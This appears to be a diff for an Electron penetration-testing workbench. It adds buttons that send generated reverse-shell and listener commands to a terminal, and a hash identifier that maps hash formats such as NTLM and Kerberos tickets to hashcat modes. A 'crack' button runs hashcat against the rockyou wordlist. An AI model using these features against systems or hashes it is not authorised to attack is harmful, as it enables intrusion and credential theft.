+const sendToTerm = (text) => { insertToTerm(text); tbModal.classList.add('hidden'); term.focus(); toast('Sent to terminal') }
+const copyText = async (text) => { const ok = await api.invoke('copy-text', text); toast(ok ? 'Copied' : 'Copy failed') }
+$('tb-shell-copy').onclick = () => copyText(genShell().cmd)
+$('tb-shell-insert').onclick = () => sendToTerm(genShell().cmd)
+$('tb-listen-copy').onclick = () => copyText(genShell().listener)
+$('tb-listen-insert').onclick = () => sendToTerm(genShell().listener)
+
+// ---- hash identifier: regex rules, most specific first ----
+const HASH_RULES = [
+  { re: /^\$2[aby]\$\d\d\$[./A-Za-z0-9]{53}$/, name: 'bcrypt', m: 3200, john: 'bcrypt' },
+  { re: /^\$6\$/, name: 'sha512crypt (Unix)', m: 1800, john: 'sha512crypt' },
+  { re: /^\$5\$/, name: 'sha256crypt (Unix)', m: 7400, john: 'sha256crypt' },
+  { re: /^\$1\$/, name: 'md5crypt (Unix)', m: 500, john: 'md5crypt' },
+  { re: /^\$apr1\$/, name: 'Apache apr1 (md5)', m: 1600, john: 'md5crypt' },
+  { re: /^\$y\$/, name: 'yescrypt', m: null, john: 'crypt' },
+  { re: /^\$krb5tgs\$23\$/, name: 'Kerberos 5 TGS-REP (RC4)', m: 13100, john: 'krb5tgs' },
+  { re: /^\$krb5asrep\$23\$/, name: 'Kerberos 5 AS-REP (RC4)', m: 18200, john: 'krb5asrep' },
+  { re: /^\$krb5tgs\$17\$/, name: 'Kerberos 5 TGS-REP (AES128)', m: 19600, john: 'krb5tgs' },
+  { re: /^\$krb5tgs\$18\$/, name: 'Kerberos 5 TGS-REP (AES256)', m: 19700, john: 'krb5tgs' },
+  { re: /^{SSHA}/, name: 'LDAP SSHA', m: 111, john: 'ssha' },
+  { re: /^\*[A-F0-9]{40}$/i, name: 'MySQL 4.1+ (SHA1)', m: 300, john: 'mysql-sha1' },
+  { re: /^[^\\/:*?"<>|]+::[^:]*:[a-f0-9]{16}:[a-f0-9]{32}:[a-f0-9]+$/i, name: 'NetNTLMv2', m: 5600, john: 'netntlmv2' },
+  { re: /^[a-f0-9]{32}:[a-f0-9]{32}$/i, name: 'NTLMv1 / double-MD5', m: 5500, john: 'netntlm' },
+  { re: /^[a-f0-9]{32}:.+$/i, name: 'md5($pass.$salt) or NTLM:salt', m: 10, john: 'dynamic' },
+  { re: /^[a-f0-9]{128}$/i, name: 'SHA-512', m: 1700, john: 'raw-sha512' },
+  { re: /^[a-f0-9]{96}$/i, name: 'SHA-384', m: 10800, john: 'raw-sha384' },
+  { re: /^[a-f0-9]{64}$/i, name: 'SHA-256', m: 1400, john: 'raw-sha256' },
+  { re: /^[a-f0-9]{56}$/i, name: 'SHA-224', m: 1300, john: 'raw-sha224' },
+  { re: /^[a-f0-9]{40}$/i, name: 'SHA-1', m: 100, john: 'raw-sha1' },
+  { re: /^[a-f0-9]{16}$/i, name: 'MySQL323', m: 200, john: 'mysql' },
+]
+// the 32-hex case is the big ambiguous one: MD5 vs NTLM vs more — list both
+const HEX32 = [
+  { name: 'MD5', m: 0, john: 'raw-md5' },
+  { name: 'NTLM', m: 1000, john: 'nt' },
+  { name: 'LM', m: 3000, john: 'lm' },
+  { name: 'MD4', m: 900, john: 'raw-md4' },
+]
+function idHash(h) {
+  h = h.trim()
+  if (!h) return []
+  if (/^[a-f0-9]{32}$/i.test(h)) return HEX32.slice()
+  for (const r of HASH_RULES) if (r.re.test(h)) return [r]
+  return []
+}
+function renderHashId() {
+  const h = $('tb-hash-in').value
+  const out = $('tb-hash-out')
+  const hits = idHash(h)
+  if (!h.trim()) { out.innerHTML = '<div class="empty">Paste a hash above.</div>'; return }
+  if (!hits.length) { out.innerHTML = '<div class="empty">No match. Could be salted or an unusual format — try hashid / name-that-hash.</div>'; return }
+  out.innerHTML = ''
+  hits.forEach(hit => {
+    const row = document.createElement('div')
+    row.className = 'hash-hit'
+    const mode = hit.m == null ? '—' : `-m ${hit.m}`
+    row.innerHTML = `<span class="hash-name">${esc(hit.name)}</span>` +
+      `<span class="hash-mode">hashcat ${esc(mode)}</span>` +
+      `<span class="hash-john">john --format=${esc(hit.john)}</span>`
+    if (hit.m != null) {
+      const b = document.createElement('button')
+      b.className = 'mini ghost'; b.textContent = 'crack'
+      b.title = 'Send a hashcat command to the terminal'
+      b.onclick = () => sendToTerm(`hashcat -m ${hit.m} '${h.trim().replace(/'/g, "")}' /usr/share/wordlists/rockyou.txt`)
+      row.appendChild(b)
+    }
+    out.appendChild(row)
+  })
+}
+$('tb-hash-in').addEventListener('input', renderHashId)
 
 // ---------- KEYBOARD ----------
 document.addEventListener('keydown', (e) => {
   // plain Ctrl+K is kill-line in the shell, so the shortcut needs Shift
   if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'k') {
     e.preventDefault(); filterInput.focus(); filterInput.select()
+  } else if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 't') {
+    e.preventDefault(); createTerminal(true)
+  } else if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'w') {
+    e.preventDefault(); if (terms.size > 1) closeTerm(activeTermId)
   } else if (e.key === 'Escape') {
     for (const m of document.querySelectorAll('.modal')) m.classList.add('hidden')
     setupDropdown.classList.add('hidden')
@@ -773,6 +1319,9 @@ document.addEventListener('keydown', (e) => {
   const info = await api.invoke('app-info')
   shellName = info.shell || 'shell'
   $('sb-version').textContent = `v${info.version} · electron ${info.electron}`
+  // fresh page: kill any shells orphaned by a reload, then open terminal tab 1
+  api.send('term-reset')
+  createTerminal(true)
   checkVpn()
   await loadTarget()
   await loadWorkspaces()
@@ -780,6 +1329,7 @@ document.addEventListener('keydown', (e) => {
     const res = await api.invoke('set-workspace', target.workspace)
     currentOutDir = res.outputDir
   }
+  await loadBox()
   updateDeleteBtn(); updateTermTitle(); clearOutputView()
   await checkEnv()
   startEnvPolling()
